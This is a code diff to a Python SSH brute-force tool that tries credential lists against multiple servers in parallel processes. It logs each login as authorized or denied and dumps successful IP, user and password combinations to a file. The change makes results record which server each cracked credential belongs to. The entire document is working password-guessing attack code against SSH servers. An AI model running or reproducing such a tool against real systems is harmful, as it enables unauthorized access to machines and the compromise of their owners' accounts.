@@ -49,27 +49,27 @@ def login(ssh_server, port, user, password):
         t2 = time()
         return err, '', t2-t1
 def brute_force(process_index, ssh_servers, port, credentials):
-    successful_logins = {}
+    successful_logins = []
     for credential in credentials:
         for ssh_server in ssh_servers:
             status = ['']
             while status[0] != True and status[0] != False:
                 status = login(ssh_server, port, credential[0], credential[1])
                 if status[0] == True:
-                    successful_logins[credential[0]] = credential[1]
+                    successful_logins.append([ssh_server, credential])
                     with lock:
-                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
+                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
                 elif status[0] == False:
                     with lock:
-                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
                 else:
                     with lock:
-                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
                     if ignore_errors:
                         break
     return successful_logins
 def main(servers, port, credentials):
-    successful_logins = {}
+    successful_logins = []
     process_count = cpu_count()
     pool = Pool(process_count)
     display('+', f"Starting {Back.MAGENTA}{process_count} Brute Force Processes{Back.RESET}")
@@ -80,7 +80,7 @@ def main(servers, port, credentials):
     for index, server_division in enumerate(server_divisions):
         processes.append(pool.apply_async(brute_force, (index, server_division, port, credentials, )))
     for process in processes:
-        successful_logins.update(process.get())
+        successful_logins.extend(process.get())
     pool.close()
     pool.join()
     display('+', f"Processes Finished Excuting")
@@ -162,6 +162,6 @@ if __name__ == "__main__":
     display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
     display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
     with open(arguments.write, 'w') as file:
-        file.write(f"User,Password\n")
-        file.write('\n'.join([f"{user},{password}" for user, password in successful_logins.items()]))
+        file.write(f"IP,User,Password\n")
+        file.write('\n'.join(f"{ip},{username},{password}" for ip, (username, password) in successful_logins))
     display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
